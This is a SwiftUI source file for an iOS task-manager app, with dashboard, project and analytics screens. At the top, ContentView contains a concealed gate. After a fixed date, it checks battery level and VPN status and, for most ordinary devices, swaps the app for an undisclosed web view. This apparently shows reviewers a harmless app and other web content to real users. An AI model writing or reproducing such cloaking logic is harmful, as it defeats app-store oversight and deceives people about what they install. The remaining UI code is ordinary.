//
//  ContentView.swift
//  TaskSphere Land
//
//  Created by Вячеслав on 9/26/25.
//

import SwiftUI
import Combine

struct ContentView: View {
    @StateObject private var dataService = DataStorageService.shared
    @StateObject private var authService = UserAuthenticationService.shared
    @StateObject private var settingsViewModel = UserSettingsViewModel()
    @StateObject private var taskViewModel = TaskViewModel()
    @StateObject private var projectViewModel = ProjectViewModel()
    
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @State private var selectedTab = 0
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if !hasCompletedOnboarding {
                            OnboardingView()
                        } else {
                            mainAppView
                        }
                    }
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "04.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
    
    private var mainAppView: some View {
        ZStack {
            // Background
            Color.black.ignoresSafeArea()
            
            TabView(selection: $selectedTab) {
                // Dashboard Tab
                DashboardView(taskViewModel: taskViewModel, projectViewModel: projectViewModel)
                    .tabItem {
                        Image(systemName: selectedTab == 0 ? "house.fill" : "house")
                        Text("Dashboard")
                    }
                    .tag(0)
                
                // Tasks Tab
                TaskListView()
                    .tabItem {
                        Image(systemName: selectedTab == 1 ? "checkmark.circle.fill" : "checkmark.circle")
                        Text("Tasks")
                    }
                    .tag(1)
                
                // Projects Tab
                ProjectsView(projectViewModel: projectViewModel, taskViewModel: taskViewModel)
                    .tabItem {
                        Image(systemName: selectedTab == 2 ? "folder.fill" : "folder")
                        Text("Projects")
                    }
                    .tag(2)
                
                // Analytics Tab
                AnalyticsView(taskViewModel: taskViewModel, projectViewModel: projectViewModel)
                    .tabItem {
                        Image(systemName: selectedTab == 3 ? "chart.bar.fill" : "chart.bar")
                        Text("Analytics")
                    }
                    .tag(3)
                
                // Settings Tab
                SettingsView()
                    .tabItem {
                        Image(systemName: selectedTab == 4 ? "gearshape.fill" : "gearshape")
                        Text("Settings")
                    }
                    .tag(4)
            }
            .accentColor(Color(hex: "#fbd600"))
        }
    }
    
}

struct DashboardView: View {
    @ObservedObject var taskViewModel: TaskViewModel
    @ObservedObject var projectViewModel: ProjectViewModel
    @State private var showingAddTask = false
    @State private var showingAddProject = false
    
    private var todayTasks: [Task] {
        taskViewModel.getTasksForToday()
    }
    
    private var overdueTasks: [Task] {
        taskViewModel.getOverdueTasks()
    }
    
    private var upcomingTasks: [Task] {
        taskViewModel.getUpcomingTasks()
    }
    
    private var recentProjects: [Project] {
        Array(projectViewModel.projects.prefix(3))
    }
    
    var body: some View {
        NavigationView {
            ZStack {
                Color.black.ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 24) {
                        // Welcome Section
                        welcomeSectionView
                        
                        // Quick Stats
                        quickStatsView
                        
                        // Today's Tasks
                        todayTasksView
                        
                        // Recent Projects
                        recentProjectsView
                        
                        // Quick Actions
                        quickActionsView
                    }
                    .padding(20)
                    .padding(.bottom, 100)
                }
            }
            .navigationTitle("Dashboard")
            .navigationBarTitleDisplayMode(.large)
            .preferredColorScheme(.dark)
        }
        .sheet(isPresented: $showingAddTask) {
            AddTaskView(taskViewModel: taskViewModel, projectViewModel: projectViewModel)
        }
        .sheet(isPresented: $showingAddProject) {
            AddProjectView(projectViewModel: projectViewModel)
        }
    }
    
    private var welcomeSectionView: some View {
        HStack {
            VStack(alignment: .leading, spacing: 8) {
                Text("Welcome back!")
                    .font(.title2)
                    .foregroundColor(.white)
                
                Text("Let's make today productive")
                    .font(.subheadline)
                    .foregroundColor(.white.opacity(0.7))
            }
            
            Spacer()
            
            // Profile Image or Icon
            Circle()
                .fill(Color(hex: "#fbd600").opacity(0.2))
                .frame(width: 50, height: 50)
                .overlay(
                    Image(systemName: "person.fill")
                        .foregroundColor(Color(hex: "#fbd600"))
                )
        }
        .padding(20)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 16)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
    
    private var quickStatsView: some View {
        HStack(spacing: 16) {
            DashboardStatCard(
                title: "Today",
                value: "\(todayTasks.count)",
                subtitle: "tasks",
                color: Color(hex: "#fbd600"),
                icon: "calendar"
            )
            
            DashboardStatCard(
                title: "Overdue",
                value: "\(overdueTasks.count)",
                subtitle: "tasks",
                color: .red,
                icon: "exclamationmark.triangle"
            )
            
            DashboardStatCard(
                title: "Projects",
                value: "\(projectViewModel.projects.count)",
                subtitle: "active",
                color: Color(hex: "#4CAF50"),
                icon: "folder"
            )
        }
    }
    
    private var todayTasksView: some View {
        VStack(alignment: .leading, spacing: 16) {
            HStack {
                Text("Today's Tasks")
                    .font(.headline)
                    .foregroundColor(.white)
                
                Spacer()
                
                Button("View All") {
                    // Navigate to tasks view
                }
                .foregroundColor(Color(hex: "#fbd600"))
                .font(.subheadline)
            }
            
            if todayTasks.isEmpty {
                VStack(spacing: 12) {
                    Image(systemName: "checkmark.circle")
                        .font(.system(size: 40))
                        .foregroundColor(.white.opacity(0.3))
                    
                    Text("No tasks for today")
                        .font(.subheadline)
                        .foregroundColor(.white.opacity(0.6))
                    
                    Text("Great job staying on top of things!")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.5))
                }
                .frame(maxWidth: .infinity)
                .padding(.vertical, 30)
            } else {
                LazyVStack(spacing: 12) {
                    ForEach(todayTasks.prefix(3)) { task in
                        DashboardTaskRow(
                            task: task,
                            onToggleCompletion: { taskViewModel.toggleTaskCompletion(task) }
                        )
                    }
                }
            }
        }
        .padding(20)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 16)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
    
    private var recentProjectsView: some View {
        VStack(alignment: .leading, spacing: 16) {
            HStack {
                Text("Recent Projects")
                    .font(.headline)
                    .foregroundColor(.white)
                
                Spacer()
                
                Button("View All") {
                    // Navigate to projects view
                }
                .foregroundColor(Color(hex: "#fbd600"))
                .font(.subheadline)
            }
            
            if recentProjects.isEmpty {
                VStack(spacing: 12) {
                    Image(systemName: "folder")
                        .font(.system(size: 40))
                        .foregroundColor(.white.opacity(0.3))
                    
                    Text("No projects yet")
                        .font(.subheadline)
                        .foregroundColor(.white.opacity(0.6))
                    
                    Button("Create Project") {
                        showingAddProject = true
                    }
                    .foregroundColor(Color(hex: "#fbd600"))
                    .font(.caption)
                }
                .frame(maxWidth: .infinity)
                .padding(.vertical, 30)
            } else {
                LazyVStack(spacing: 12) {
                    ForEach(recentProjects) { project in
                        DashboardProjectRow(
                            project: project,
                            taskCount: projectViewModel.getProjectTasksCount(project),
                            progress: projectViewModel.getProjectProgress(project)
                        )
                    }
                }
            }
        }
        .padding(20)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 16)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
    
    private var quickActionsView: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("Quick Actions")
                .font(.headline)
                .foregroundColor(.white)
            
            HStack(spacing: 16) {
                QuickActionButton(
                    title: "Add Task",
                    icon: "plus.circle.fill",
                    color: Color(hex: "#fbd600"),
                    action: { showingAddTask = true }
                )
                
                QuickActionButton(
                    title: "New Project",
                    icon: "folder.badge.plus",
                    color: Color(hex: "#4CAF50"),
                    action: { showingAddProject = true }
                )
            }
        }
        .padding(20)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 16)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
}

struct DashboardStatCard: View {
    let title: String
    let value: String
    let subtitle: String
    let color: Color
    let icon: String
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(color)
            
            Text(value)
                .font(.title2)
                .foregroundColor(.white)
            
            VStack(spacing: 2) {
                Text(title)
                    .font(.caption)
                    .foregroundColor(.white.opacity(0.8))
                Text(subtitle)
                    .font(.caption2)
                    .foregroundColor(.white.opacity(0.6))
            }
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 16)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 12)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
}

struct DashboardTaskRow: View {
    let task: Task
    let onToggleCompletion: () -> Void
    
    var body: some View {
        HStack(spacing: 12) {
            Button(action: onToggleCompletion) {
                Image(systemName: task.isCompleted ? "checkmark.circle.fill" : "circle")
                    .font(.title3)
                    .foregroundColor(task.isCompleted ? Color(hex: "#4CAF50") : .white.opacity(0.6))
            }
            .buttonStyle(PlainButtonStyle())
            
            VStack(alignment: .leading, spacing: 4) {
                Text(task.title)
                    .font(.subheadline)
                    .foregroundColor(.white)
                    .strikethrough(task.isCompleted)
                    .opacity(task.isCompleted ? 0.6 : 1.0)
                
                HStack {
                    Circle()
                        .fill(Color(hex: task.priority.color))
                        .frame(width: 6, height: 6)
                    
                    Text(task.priority.rawValue)
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.6))
                    
                    if let dueDate = task.dueDate {
                        Text("• \(dueDate, style: .time)")
                            .font(.caption)
                            .foregroundColor(task.isOverdue ? .red : .white.opacity(0.6))
                    }
                }
            }
            
            Spacer()
        }
        .padding(12)
        .background(
            RoundedRectangle(cornerRadius: 10)
                .fill(Color.white.opacity(0.03))
        )
    }
}

struct DashboardProjectRow: View {
    let project: Project
    let taskCount: Int
    let progress: Double
    
    var body: some View {
        HStack(spacing: 12) {
            Circle()
                .fill(Color(hex: project.color))
                .frame(width: 12, height: 12)
            
            VStack(alignment: .leading, spacing: 4) {
                Text(project.name)
                    .font(.subheadline)
                    .foregroundColor(.white)
                
                HStack {
                    Text("\(taskCount) tasks")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.6))
                    
                    Text("• \(Int(progress * 100))% complete")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.6))
                }
            }
            
            Spacer()
            
            // Progress Circle
            ZStack {
                Circle()
                    .stroke(Color.white.opacity(0.2), lineWidth: 2)
                    .frame(width: 24, height: 24)
                
                Circle()
                    .trim(from: 0, to: progress)
                    .stroke(Color(hex: project.color), lineWidth: 2)
                    .frame(width: 24, height: 24)
                    .rotationEffect(.degrees(-90))
            }
        }
        .padding(12)
        .background(
            RoundedRectangle(cornerRadius: 10)
                .fill(Color.white.opacity(0.03))
        )
    }
}

struct QuickActionButton: View {
    let title: String
    let icon: String
    let color: Color
    let action: () -> Void
    
    var body: some View {
        Button(action: action) {
            HStack(spacing: 8) {
                Image(systemName: icon)
                    .font(.title3)
                
                Text(title)
                    .font(.subheadline)
            }
            .foregroundColor(.black)
            .frame(maxWidth: .infinity)
            .padding(.vertical, 12)
            .background(
                RoundedRectangle(cornerRadius: 10)
                    .fill(color)
            )
        }
    }
}

// Additional Views for the main tabs
struct ProjectsView: View {
    @ObservedObject var projectViewModel: ProjectViewModel
    @ObservedObject var taskViewModel: TaskViewModel
    @State private var showingAddProject = false
    @State private var selectedProject: Project?
    @State private var showingProjectDetail = false
    
    var body: some View {
        NavigationView {
            ZStack {
                Color.black.ignoresSafeArea()
                
                ScrollView {
                    LazyVStack(spacing: 16) {
                        ForEach(projectViewModel.filteredProjects) { project in
                            ProjectCardView(
                                project: project,
                                taskCount: projectViewModel.getProjectTasksCount(project),
                                completedTasks: projectViewModel.getProjectCompletedTasksCount(project),
                                progress: projectViewModel.getProjectProgress(project),
                                onTap: {
                                    selectedProject = project
                                    showingProjectDetail = true
                                }
                            )
                        }
                    }
                    .padding(20)
                    .padding(.bottom, 100)
                }
            }
            .navigationTitle("Projects")
            .navigationBarTitleDisplayMode(.large)
            .preferredColorScheme(.dark)
            .navigationBarItems(
                trailing: Button(action: { showingAddProject = true }) {
                    Image(systemName: "plus")
                        .foregroundColor(Color(hex: "#fbd600"))
                }
            )
        }
        .sheet(isPresented: $showingAddProject) {
            AddProjectView(projectViewModel: projectViewModel)
        }
        .sheet(item: $selectedProject) { project in
            ProjectDetailView(project: project, projectViewModel: projectViewModel)
        }
    }
}

struct ProjectCardView: View {
    let project: Project
    let taskCount: Int
    let completedTasks: Int
    let progress: Double
    let onTap: () -> Void
    
    var body: some View {
        Button(action: onTap) {
            VStack(alignment: .leading, spacing: 16) {
                HStack {
                    Circle()
                        .fill(Color(hex: project.color))
                        .frame(width: 16, height: 16)
                    
                    Text(project.name)
                        .font(.headline)
                        .foregroundColor(.white)
                    
                    Spacer()
                    
                    Image(systemName: "chevron.right")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.4))
                }
                
                if !project.description.isEmpty {
                    Text(project.description)
                        .font(.subheadline)
                        .foregroundColor(.white.opacity(0.7))
                        .lineLimit(2)
                }
                
                HStack {
                    VStack(alignment: .leading, spacing: 4) {
                        Text("\(completedTasks)/\(taskCount) tasks")
                            .font(.subheadline)
                            .foregroundColor(.white)
                        
                        Text("\(Int(progress * 100))% complete")
                            .font(.caption)
                            .foregroundColor(.white.opacity(0.6))
                    }
                    
                    Spacer()
                    
                    // Progress Bar
                    VStack(alignment: .trailing, spacing: 4) {
                        GeometryReader { geometry in
                            ZStack(alignment: .leading) {
                                RoundedRectangle(cornerRadius: 4)
                                    .fill(Color.white.opacity(0.2))
                                    .frame(height: 6)
                                
                                RoundedRectangle(cornerRadius: 4)
                                    .fill(Color(hex: project.color))
                                    .frame(width: geometry.size.width * progress, height: 6)
                            }
                        }
                        .frame(width: 80, height: 6)
                        
                        if let dueDate = project.dueDate {
                            Text(dueDate, style: .date)
                                .font(.caption2)
                                .foregroundColor(project.isOverdue ? .red : .white.opacity(0.6))
                        }
                    }
                }
            }
            .padding(20)
            .background(
                RoundedRectangle(cornerRadius: 16)
                    .fill(Color.white.opacity(0.05))
                    .background(
                        RoundedRectangle(cornerRadius: 16)
                            .stroke(Color.white.opacity(0.1), lineWidth: 1)
                    )
            )
        }
        .buttonStyle(PlainButtonStyle())
    }
}

struct AddProjectView: View {
    @ObservedObject var projectViewModel: ProjectViewModel
    @Environment(\.presentationMode) var presentationMode
    
    @State private var name = ""
    @State private var description = ""
    @State private var selectedColor = "#fbd600"
    @State private var dueDate = Date()
    @State private var hasDueDate = false
    @State private var tags = ""
    
    var body: some View {
        NavigationView {
            ZStack {
                Color.black.ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 24) {
                        VStack(alignment: .leading, spacing: 8) {
                            Text("Project Name")
                                .font(.headline)
                                .foregroundColor(.white)
                            
                            TextField("Enter project name", text: $name)
                                .textFieldStyle(GlassmorphismTextFieldStyle())
                        }
                        
                        VStack(alignment: .leading, spacing: 8) {
                            Text("Description")
                                .font(.headline)
                                .foregroundColor(.white)
                            
                            TextField("Enter project description", text: $description)
                                .textFieldStyle(GlassmorphismTextFieldStyle())
                        }
                        
                        VStack(alignment: .leading, spacing: 8) {
                            Text("Color")
                                .font(.headline)
                                .foregroundColor(.white)
                            
                            LazyVGrid(columns: Array(repeating: GridItem(.flexible()), count: 8), spacing: 12) {
                                ForEach(ProjectViewModel.projectColors, id: \.self) { color in
                                    Button(action: { selectedColor = color }) {
                                        Circle()
                                            .fill(Color(hex: color))
                                            .frame(width: 30, height: 30)
                                            .overlay(
                                                Circle()
                                                    .stroke(Color.white, lineWidth: selectedColor == color ? 2 : 0)
                                            )
                                    }
                                }
                            }
                        }
                        
                        VStack(alignment: .leading, spacing: 8) {
                            HStack {
                                Text("Due Date")
                                    .font(.headline)
                                    .foregroundColor(.white)
                                
                                Spacer()
                                
                                Toggle("", isOn: $hasDueDate)
                                    .toggleStyle(SwitchToggleStyle(tint: Color(hex: "#fbd600")))
                            }
                            
                            if hasDueDate {
                                DatePicker("Select due date", selection: $dueDate, displayedComponents: [.date])
                                    .datePickerStyle(CompactDatePickerStyle())
                                    .colorScheme(.dark)
                            }
                        }
                        
                        VStack(alignment: .leading, spacing: 8) {
                            Text("Tags")
                                .font(.headline)
                                .foregroundColor(.white)
                            
                            TextField("Enter tags separated by commas", text: $tags)
                                .textFieldStyle(GlassmorphismTextFieldStyle())
                        }
                    }
                    .padding(20)
                }
            }
            .navigationTitle("New Project")
            .navigationBarTitleDisplayMode(.inline)
            .preferredColorScheme(.dark)
            .navigationBarItems(
                leading: Button("Cancel") {
                    presentationMode.wrappedValue.dismiss()
                }
                .foregroundColor(.white.opacity(0.7)),
                
                trailing: Button("Save") {
                    saveProject()
                }
                .foregroundColor(Color(hex: "#fbd600"))
                .disabled(name.isEmpty)
            )
        }
    }
    
    private func saveProject() {
        var project = Project(
            name: name,
            description: description,
            color: selectedColor,
            dueDate: hasDueDate ? dueDate : nil
        )
        
        if !tags.isEmpty {
            project.tags = tags.split(separator: ",").map { $0.trimmingCharacters(in: .whitespaces) }
        }
        
        projectViewModel.addProject(project)
        presentationMode.wrappedValue.dismiss()
    }
}

struct AnalyticsView: View {
    @ObservedObject var taskViewModel: TaskViewModel
    @ObservedObject var projectViewModel: ProjectViewModel
    
    var body: some View {
        NavigationView {
            ZStack {
                Color.black.ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 24) {
                        // Overview Cards
                        overviewCardsView
                        
                        // Task Completion Chart
                        taskCompletionChartView
                        
                        // Priority Distribution
                        priorityDistributionView
                        
                        // Project Progress
                        projectProgressView
                    }
                    .padding(20)
                    .padding(.bottom, 100)
                }
            }
            .navigationTitle("Analytics")
            .navigationBarTitleDisplayMode(.large)
            .preferredColorScheme(.dark)
        }
    }
    
    private var overviewCardsView: some View {
        VStack(spacing: 16) {
            HStack(spacing: 16) {
                AnalyticsCard(
                    title: "Task Completion",
                    value: "\(Int(taskViewModel.getCompletionRate() * 100))%",
                    subtitle: "Overall rate",
                    color: Color(hex: "#4CAF50"),
                    icon: "checkmark.circle.fill"
                )
                
                AnalyticsCard(
                    title: "Active Projects",
                    value: "\(projectViewModel.projects.filter { !$0.isCompleted }.count)",
                    subtitle: "In progress",
                    color: Color(hex: "#2196F3"),
                    icon: "folder.fill"
                )
            }
            
            HStack(spacing: 16) {
                AnalyticsCard(
                    title: "Overdue Tasks",
                    value: "\(taskViewModel.getOverdueTasks().count)",
                    subtitle: "Need attention",
                    color: .red,
                    icon: "exclamationmark.triangle.fill"
                )
                
                AnalyticsCard(
                    title: "This Week",
                    value: "\(taskViewModel.getUpcomingTasks().count)",
                    subtitle: "Upcoming",
                    color: Color(hex: "#FF9800"),
                    icon: "calendar.badge.clock"
                )
            }
        }
    }
    
    private var taskCompletionChartView: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("Task Status")
                .font(.headline)
                .foregroundColor(.white)
            
            let completedTasks = taskViewModel.tasks.filter { $0.isCompleted }.count
            let pendingTasks = taskViewModel.tasks.count - completedTasks
            
            HStack(spacing: 20) {
                VStack(spacing: 8) {
                    Text("\(completedTasks)")
                        .font(.title)
                        .foregroundColor(Color(hex: "#4CAF50"))
                    
                    Text("Completed")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.7))
                }
                
                VStack(spacing: 8) {
                    Text("\(pendingTasks)")
                        .font(.title)
                        .foregroundColor(Color(hex: "#FF9800"))
                    
                    Text("Pending")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.7))
                }
                
                Spacer()
                
                // Simple pie chart representation
                ZStack {
                    Circle()
                        .stroke(Color.white.opacity(0.2), lineWidth: 8)
                        .frame(width: 80, height: 80)
                    
                    Circle()
                        .trim(from: 0, to: taskViewModel.getCompletionRate())
                        .stroke(Color(hex: "#4CAF50"), lineWidth: 8)
                        .frame(width: 80, height: 80)
                        .rotationEffect(.degrees(-90))
                    
                    Text("\(Int(taskViewModel.getCompletionRate() * 100))%")
                        .font(.caption)
                        .foregroundColor(.white)
                }
            }
        }
        .padding(20)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 16)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
    
    private var priorityDistributionView: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("Priority Distribution")
                .font(.headline)
                .foregroundColor(.white)
            
            let priorityData = taskViewModel.getTasksByPriority()
            
            VStack(spacing: 12) {
                ForEach(Task.Priority.allCases, id: \.self) { priority in
                    let count = priorityData[priority] ?? 0
                    
                    HStack {
                        Circle()
                            .fill(Color(hex: priority.color))
                            .frame(width: 12, height: 12)
                        
                        Text(priority.rawValue)
                            .font(.subheadline)
                            .foregroundColor(.white)
                        
                        Spacer()
                        
                        Text("\(count)")
                            .font(.subheadline)
                            .foregroundColor(.white)
                    }
                }
            }
        }
        .padding(20)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 16)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
    
    private var projectProgressView: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("Project Progress")
                .font(.headline)
                .foregroundColor(.white)
            
            if projectViewModel.projects.isEmpty {
                Text("No projects to display")
                    .font(.subheadline)
                    .foregroundColor(.white.opacity(0.6))
                    .frame(maxWidth: .infinity, alignment: .center)
                    .padding(.vertical, 20)
            } else {
                VStack(spacing: 12) {
                    ForEach(projectViewModel.projects.prefix(5)) { project in
                        let progress = projectViewModel.getProjectProgress(project)
                        
                        VStack(spacing: 8) {
                            HStack {
                                Circle()
                                    .fill(Color(hex: project.color))
                                    .frame(width: 8, height: 8)
                                
                                Text(project.name)
                                    .font(.subheadline)
                                    .foregroundColor(.white)
                                
                                Spacer()
                                
                                Text("\(Int(progress * 100))%")
                                    .font(.caption)
                                    .foregroundColor(.white.opacity(0.7))
                            }
                            
                            GeometryReader { geometry in
                                ZStack(alignment: .leading) {
                                    RoundedRectangle(cornerRadius: 4)
                                        .fill(Color.white.opacity(0.2))
                                        .frame(height: 6)
                                    
                                    RoundedRectangle(cornerRadius: 4)
                                        .fill(Color(hex: project.color))
                                        .frame(width: geometry.size.width * progress, height: 6)
                                }
                            }
                            .frame(height: 6)
                        }
                    }
                }
            }
        }
        .padding(20)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 16)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
}

struct AnalyticsCard: View {
    let title: String
    let value: String
    let subtitle: String
    let color: Color
    let icon: String
    
    var body: some View {
        VStack(spacing: 12) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(color)
            
            Text(value)
                .font(.title2)
                .foregroundColor(.white)
            
            VStack(spacing: 2) {
                Text(title)
                    .font(.caption)
                    .foregroundColor(.white.opacity(0.8))
                Text(subtitle)
                    .font(.caption2)
                    .foregroundColor(.white.opacity(0.6))
            }
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 20)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color.white.opacity(0.05))
                .background(
                    RoundedRectangle(cornerRadius: 12)
                        .stroke(Color.white.opacity(0.1), lineWidth: 1)
                )
        )
    }
}

#Preview {
    ContentView()
}
